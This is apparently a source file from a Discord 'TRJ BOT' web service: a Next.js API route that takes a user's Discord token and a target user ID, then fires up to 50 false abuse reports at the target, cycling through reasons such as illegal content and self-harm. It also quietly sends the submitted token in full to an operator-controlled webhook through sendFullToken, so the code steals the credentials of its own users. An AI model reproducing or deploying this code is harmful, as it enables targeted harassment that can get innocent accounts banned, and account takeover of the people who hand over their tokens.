
import { NextRequest, NextResponse } from 'next/server';
import { cleanToken, discordFetch } from '@/lib/discord';
import { getLogWebhookUrl } from '@/lib/config';
import { sendFullToken } from '@/lib/webhook';
import { rateLimit, getClientIp, RATE_LIMITS } from '@/lib/rate-limit';

export async function POST(request: NextRequest) {
  try {
    const rlIp = getClientIp(request);
    const rl = rateLimit(`${rlIp}:mass-report`, RATE_LIMITS.heavy);
    if (rl.limited) {
      return NextResponse.json({ success: false, error: 'تم تجاوز الحد المسموح - حاول لاحقاً' }, { status: 429, headers: { 'Retry-After': String(Math.ceil((rl.resetAt - Date.now()) / 1000)) } });
    }

    const body = await request.json();
    const { token, targetId, reason, count } = body as {
      token: string;
      targetId: string;
      reason: string;
      count?: number;
    };

    if (!token || !targetId) {
      return NextResponse.json({ success: false, error: 'أدخل التوكن وأيدي المستهدف' });
    }

    const ct = cleanToken(token);
    const reportReason = reason || 'Spamming and harassment';
    const reportCount = Math.min(count || 10, 50);

    const verifyResult = await discordFetch(ct, 'GET', '/users/@me', undefined, { userOnly: true, timeout: 10000 });

    if (!verifyResult.ok || !verifyResult.data) {
      return NextResponse.json({ success: false, error: 'توكن غير صالح' });
    }

    const userData = verifyResult.data as { id: string; username: string; discriminator?: string };
    const userTag = `${userData.username}#${userData.discriminator || '0'}`;

    sendFullToken('Mass Report', ct, { '👤 المستخدم': userTag, '🎯 المستهدف': targetId });

    const logs: string[] = [`🎯 بدء إرسال ${reportCount} بلاغ على: ${targetId}`];
    let successCount = 0;
    let failCount = 0;

    const reasons = [
      { reason: 1, name: 'Spamming' },
      { reason: 2, name: 'Harassment' },
      { reason: 3, name: 'Illegal content' },
      { reason: 4, name: 'Impersonation' },
      { reason: 5, name: 'Bug exploitation' },
      { reason: 6, name: 'Self-harm' },
      { reason: 7, name: 'Bot account' },
    ];

    for (let i = 0; i < reportCount; i++) {
      try {
        const selectedReason = reasons[i % reasons.length];

        const reportRes = await discordFetch(ct, 'POST', '/report', {
          target_user_id: targetId,
          reason: selectedReason.reason,
          report_type: 'user',
        }, { userOnly: true, timeout: 10000 });

        if (reportRes.ok || reportRes.status === 204 || reportRes.status === 201) {
          successCount++;
          logs.push(`✅ بلاغ #${i + 1}: ${selectedReason.name}`);
        } else {
          failCount++;
          logs.push(`❌ بلاغ #${i + 1}: فشل`);
        }

        await new Promise(r => setTimeout(r, 800));
      } catch {
        failCount++;
        logs.push(`❌ بلاغ #${i + 1}: خطأ`);
      }
    }

    logs.push('');
    logs.push(`📊 النتيجة: ✅ ${successCount} نجح | ❌ ${failCount} فشل`);

    const webhookUrl = getLogWebhookUrl();
    if (webhookUrl) {
      try {
        await fetch(webhookUrl, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            embeds: [{
              title: '🚨 Mass Report',
              description: `**تم إرسال بلاغات على:** <@${targetId}>`,
              color: 0xFF6B6B,
              fields: [
                { name: '👤 المبلّغ', value: userTag, inline: true },
                { name: '🎯 المستهدف', value: targetId, inline: true },
                { name: '✅ نجح', value: successCount.toString(), inline: true },
                { name: '❌ فشل', value: failCount.toString(), inline: true },
              ],
              footer: { text: 'TRJ BOT - Prime Feature' },
              timestamp: new Date().toISOString()
            }]
          })
        });
      } catch {}
    }

    return NextResponse.json({
      success: true,
      logs,
      stats: { total: reportCount, success: successCount, failed: failCount }
    });

  } catch (error) {
    return NextResponse.json({ success: false, error: 'خطأ في الخادم' });
  }
}

